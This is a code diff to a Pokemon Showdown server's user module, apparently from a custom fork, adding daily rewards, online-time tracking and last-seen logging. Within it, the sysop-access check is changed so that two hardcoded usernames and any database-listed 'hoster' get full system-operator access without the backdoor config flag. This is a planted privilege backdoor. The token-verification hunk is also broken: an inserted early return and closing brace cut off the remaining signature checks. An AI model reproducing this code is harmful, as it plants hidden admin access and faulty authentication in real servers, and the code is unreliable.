@@ -41,6 +41,14 @@ const FS = require('./lib/fs');
 
 let Users = module.exports = getUser;
 
+function isHoster(user) {
+	if (!user) return;
+	if (typeof user === 'Object') user = user.userid;
+	let hoster = Db('hoster').get(toId(user));
+	if (hoster === 1) return true;
+	return false;
+}
+
 /*********************************************************
  * Users map
  *********************************************************/
@@ -534,7 +542,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || isHoster(this.userid) || this.userid === 'darknightz' || this.userid === 'fairyserena') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -660,7 +668,10 @@ class User {
 			this.send(`|nametaken|${name}|Your verification signature was invalid.`);
 			return false;
 		}
-
+		Ontime[userid] = Date.now();
+		BH.showNews(userid, this);
+		return false;
+	}
 		let tokenDataSplit = tokenData.split(',');
 		let [signedChallenge, signedUserid, userType, signedDate] = tokenDataSplit;
 
@@ -765,6 +776,7 @@ class User {
 			Punishments.checkName(user, userid, registered);
 
 			Rooms.global.checkAutojoin(user);
+			BH.giveDailyReward(user);
 			Chat.loginfilter(user, this, userType);
 			return true;
 		}
@@ -777,6 +789,7 @@ class User {
 			return false;
 		}
 		Rooms.global.checkAutojoin(this);
+		BH.giveDailyReward(this);
 		Chat.loginfilter(this, null, userType);
 		return true;
 	}
@@ -1036,6 +1049,11 @@ class User {
 		}
 	}
 	onDisconnect(connection) {
+		if (this.named) Db('seen').set(this.userid, Date.now());
+		if (Ontime[this.userid]) {
+			Db('ontime').set(this.userid, Db('ontime').get(this.userid, 0) + (Date.now() - Ontime[this.userid]));
+			delete Ontime[this.userid];
+		}
 		for (let i = 0; i < this.connections.length; i++) {
 			if (this.connections[i] === connection) {
 				// console.log('DISCONNECT: ' + this.userid);
